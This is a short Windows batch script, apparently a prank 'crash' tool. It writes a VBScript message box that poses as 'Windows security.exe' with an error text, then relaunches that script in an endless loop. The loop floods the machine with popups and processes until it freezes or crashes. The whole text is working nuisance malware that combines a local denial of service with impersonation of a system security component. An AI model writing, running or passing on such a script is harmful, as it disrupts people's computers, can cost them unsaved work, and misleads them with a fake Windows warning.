@echo off
cls
echo x=msgbox("ereur" ,0, "Windows security.exe") >> msgboxcrach1.vbs
:start
start msgboxcrach1.vbs /min
goto start